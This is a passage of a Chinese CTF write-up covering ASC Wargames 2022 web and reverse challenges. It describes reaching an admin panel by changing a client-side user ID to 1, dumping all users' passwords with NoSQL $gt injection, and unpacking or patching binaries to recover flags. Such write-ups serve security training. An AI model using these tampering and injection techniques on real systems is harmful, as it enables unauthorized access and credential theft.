class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> link<span class="token punctuation">,</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span> dataSend<span class="token punctuation">,</span><span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/json; charset=utf-8"</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>exists <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>link<span class="token operator">=</span><span class="token string">'/otp/verify'</span><span class="token punctuation">;</span>firstTime<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'hidden'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'OTP_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token string">'appear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'OTP'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span>errors <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">CCas</span><span class="token punctuation">(</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">MD5</span><span class="token punctuation">(</span><span class="token string">'vverrriifiied'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">MD5</span><span class="token punctuation">(</span><span class="token string">'saxxx'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/admin'</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span>errors <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>exists <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Wrong username'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问页面即可得到最终的Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/borgOLBQxPZepYHuRwcHdA.png" alt="1-2-2"></p><h3 id="1-3-Doctor-X-Aha"><a href="#1-3-Doctor-X-Aha" class="headerlink" title="1-3 Doctor X [Aha!]"></a>1-3 <strong>Doctor X [Aha!]</strong></h3><p>Doctor X是Web题目中的第三题，当时并没有解决，所以仔细阅读了出题人的比赛后给出的<a href="https://ahmed8magdy.medium.com/asc-wargames-qualifications-2022-web-challenge-write-up-dd19cb55d5eb">WriteUp</a>来查看自己思路上的欠缺。</p><p>Doctor X网站也是一个登陆系统的网站，只不过该网站是使用Angular框架书写，导致页面的客户端源码非常不好读。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151635.png" alt="1-3-1"></p><p>通过注册和登陆后，我们可以进入到系统内部。系统内部显示了登陆用户的用户名，并且存在一个更新密码的逻辑。我一开始以为是XSS漏洞，毕竟用户名是用户可以操控的并且会回显。但是后来出题人在discord中给出线索，让我们专注于服务器端的漏洞。</p><p>因此，存在漏洞的地方应该就在更新密码的逻辑部分，如下所示。但是基于框架的客户端源码并不好读，所以我们也没有看出什么敏感的信息。</p><pre class="line-numbers language-none"><code class="language-none">function SettingsComponent_form_5_div_6_Template(rf, ctx) &#123; if (rf &amp; 1) &#123;    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](0, &quot;div&quot;, 14)(1, &quot;span&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](2, &quot;Old Password required &quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]()();&#125; &#125;function SettingsComponent_form_5_div_12_Template(rf, ctx) &#123; if (rf &amp; 1) &#123;    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](0, &quot;div&quot;, 14)(1, &quot;span&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](2, &quot;New Password required&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]()();&#125; &#125;function SettingsComponent_form_5_Template(rf, ctx) &#123; if (rf &amp; 1) &#123;    const _r6 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵgetCurrentView&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](0, &quot;form&quot;, 4)(1, &quot;div&quot;, 5)(2, &quot;label&quot;, 6);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](3, &quot;Old Password&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelement&quot;](4, &quot;input&quot;, 7, 8);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtemplate&quot;](6, SettingsComponent_form_5_div_6_Template, 3, 0, &quot;div&quot;, 9);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](7, &quot;div&quot;, 5)(8, &quot;label&quot;, 10);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](9, &quot;New Password&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelement&quot;](10, &quot;input&quot;, 11, 12);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtemplate&quot;](12, SettingsComponent_form_5_div_12_Template, 3, 0, &quot;div&quot;, 9);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](13, &quot;button&quot;, 13);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵlistener&quot;](&quot;click&quot;, function SettingsComponent_form_5_Template_button_click_13_listener() &#123; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵrestoreView&quot;](_r6); const _r1 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵreference&quot;](5); const _r3 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵreference&quot;](11); const ctx_r5 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵnextContext&quot;](); return _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵresetView&quot;](ctx_r5.ChangeUserPassword(_r1.value, _r3.value)); &#125;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](14, &quot;Update Password&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]()();&#125; if (rf &amp; 2) &#123;    const ctx_r0 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵnextContext&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵproperty&quot;](&quot;formGroup&quot;, ctx_r0.ChangePassword);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵadvance&quot;](6);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵproperty&quot;](&quot;ngIf&quot;, (ctx_r0.ChangePassword.controls[&quot;oldpass&quot;] &#x3D;&#x3D; null ? null : ctx_r0.ChangePassword.controls[&quot;oldpass&quot;].invalid) &amp;&amp; (ctx_r0.ChangePassword.controls[&quot;oldpass&quot;].dirty || ctx_r0.ChangePassword.controls[&quot;oldpass&quot;].touched));    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵadvance&quot;](6);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵproperty&quot;](&quot;ngIf&quot;, ctx_r0.ChangePassword.controls[&quot;newpassword&quot;].invalid &amp;&amp; (ctx_r0.ChangePassword.controls[&quot;newpassword&quot;].dirty || ctx_r0.ChangePassword.controls[&quot;newpassword&quot;].touched));&#125; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从WriteUp中我看到原来还可以直接通过F12-&gt;Application-&gt;Storage查看客户端存储的Cookie或者其他信息。原来漏洞点就在这里，客户端会根据当前用户ID和用户名访问不同的页面。当修改UserID为1，即admin时，则会进入admin的系统界面。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151705.png" alt="1-3-2"></p><p>在admin的dashboard存在搜索所有用户及其密码的API。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151722.png" alt="1-3-3"></p><p>接着多输入一个}使其报错，通过报错信息查看数据库的一些基本信息。由下可以看到，数据库是nosql类型的，换句话说就是以键值对形式(json)存储的数据。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151742.png" alt="1-3-4"></p><p>根据nosql注入的技巧，详见<a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">HackTricks相关页面</a>,我们可以使用$gt来获得所有用户的信息。最终自然flag也在其中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151807.png" alt="1-3-5"></p><h2 id="2-Reverse"><a href="#2-Reverse" class="headerlink" title="2 Reverse"></a><strong>2 Reverse</strong></h2><h3 id="2-1-Unpacking-101"><a href="#2-1-Unpacking-101" class="headerlink" title="2-1 Unpacking 101"></a><strong>2-1 Unpacking 101</strong></h3><p>首先改题目提供了一个exe程序。程序的主题逻辑，为寻找程序中隐藏的第二个程序文件的位置，将第二个exe文件的内容以Loadexe()函数的形式加载到内存当中运行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151824.png" alt="2-1-1"></p><p>了解了这些，我们来看程序最关键的函数unpackFiles()，在这个函数中，提供了哈夫曼压缩、和简单的解密函数。初次阅读，本以为这些压缩算法和解密函数应用到解题过程中。为此，我多次修改了exe文件中指定位置存放的内容。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span> binSignature <span class="token operator">==</span> <span class="token number">1095125318</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdata<span class="token punctuation">,</span> <span class="token number">0x110u</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> packArchive<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Extracting >>>> %s [%li]\n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>    size <span class="token operator">=</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">;</span>    content <span class="token operator">=</span> <span class="token punctuation">(</span>UCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> packArchive<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>packArchive<span class="token punctuation">)</span><span class="token punctuation">;</span>    keyProvided <span class="token operator">=</span> pdata<span class="token punctuation">.</span>key <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecompressing >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token punctuation">(</span>HuffmanD <span class="token operator">*</span><span class="token punctuation">)</span>operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0x280Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      HuffmanD<span class="token operator">::</span><span class="token function">HuffmanD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>      huf <span class="token operator">=</span> v4<span class="token punctuation">;</span>      outsize <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">Decompress</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> content<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>      output <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">getOutput</span><span class="token punctuation">(</span>huf<span class="token punctuation">)</span><span class="token punctuation">;</span>      decryptedContent <span class="token operator">=</span> output<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecrypting >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        decryptedContent <span class="token operator">=</span> <span class="token punctuation">(</span>UCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>keyProvided <span class="token punctuation">)</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> size<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        outsize <span class="token operator">=</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecompressing >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token punctuation">(</span>HuffmanD <span class="token operator">*</span><span class="token punctuation">)</span>operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0x280Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HuffmanD<span class="token operator">::</span><span class="token function">HuffmanD</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>        huf <span class="token operator">=</span> v5<span class="token punctuation">;</span>        outsize <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">Decompress</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> content<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>        output <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">getOutput</span><span class="token punctuation">(</span>huf<span class="token punctuation">)</span><span class="token punctuation">;</span>        decryptedContent <span class="token operator">=</span> <span class="token punctuation">(</span>UCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>outsize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecrypting >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>keyProvided <span class="token punctuation">)</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> outsize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> outsize<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pdata<span class="token punctuation">.</span>parameter <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      outsize <span class="token operator">=</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">;</span>      decryptedContent <span class="token operator">=</span> content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnpacking Successful!\n\nExecuting from Memory >>>> %s [%i]\n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> outsize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LoadEXE</span><span class="token punctuation">(</span>decryptedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是由于fread(&amp;pdata, 0x110u, 1u, packArchive);中pada读取的结构体的parameter变量为0. 所以我们猜测，隐藏的第二个exe内容并没有进行相应的压缩或者解密的处理。而是直接可以运行，双击程序运行显示的内容也和我们的猜想一致。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151854.png" alt="2-1-2"></p><p>下图为pdata结构体读取的内容。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151917.png" alt="2-1-3"></p><p>之后的内容，也是一个exe文件的头的格式，既然运行loadexe的方式行不通，我选择先将隐藏exe文件的内容复制为新的文件，再用ida对其进行反编译。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151938.png" alt="2-1-4"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152000.png" alt="2-1-5"></p><p>发现其存在字符串对比的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">54</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v10<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_1181020</span><span class="token punctuation">(</span><span class="token string">"Wrong Flag :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">sub_1181020</span><span class="token punctuation">(</span><span class="token string">"Correct Flag :)\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们把断点打在循环开始之前，之后便在内存当中找到了flag的位置。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152024.png" alt="2-1-6"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152056.png" alt="2-1-7"></p><h3 id="2-2-PE-Anatomy"><a href="#2-2-PE-Anatomy" class="headerlink" title="2-2 PE Anatomy"></a>2-2 <strong>PE Anatomy</strong></h3><p>该题目提供了两个二进制文件，其中一个为Dont_run.bin，另一个为PE_Anatomy.exe。通过查看PE_Anatomy.exe文件的反编译代码，其主逻辑为通过读取Dont_run.bin中的特定位置的内容，并判断该位置是否符合if判断的条件，最终运行解密函数，将隐藏在其中的flag解密并显示出来。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152114.png" alt="2-2-1"></p><p>关于读取Dont_run.bin特定位置的内容，进行if语句进行判断。我们需要根据if判断语句中的数值，基于其类型word还是dword亦或者是i_64等对Dont_run.bin中特定位置的内容进行修改。</p><p>由于修改的位置很多，所以我就不一一列举了。下面是一些例子：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152133.png" alt="2-2-2"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152150.png" alt="2-2-3"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152206.png" alt="2-2-4"></p><p>这个函数是for循环函数，这个函数不同于上面的if判断语句，可以直接修改内容。出题人绕了一个小弯，意图考察同学们对于地址知识的熟悉程度。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v35 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>lpBuffer<span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">66</span><span class="token punctuation">]</span> <span class="token operator">+</span> lpBuffer<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v8 <span class="token operator">=</span> <span class="token string">"bbbbb"</span><span class="token punctuation">;</span>          v9 <span class="token operator">=</span> v35 <span class="token operator">-</span> <span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token string">"bbbbb"</span><span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v10 <span class="token operator">=</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v8 <span class="token operator">!=</span> v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token operator">++</span>v8<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v10 <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">goto</span> LABEL_53<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          v11 <span class="token operator">=</span> v10 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>LABEL_53<span class="token operator">:</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token punctuation">)</span>            v33 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        v4 <span class="token operator">=</span> <span class="token string">"aaaaa"</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> v35 <span class="token operator">-</span> <span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token string">"aaaaa"</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v6 <span class="token operator">=</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span 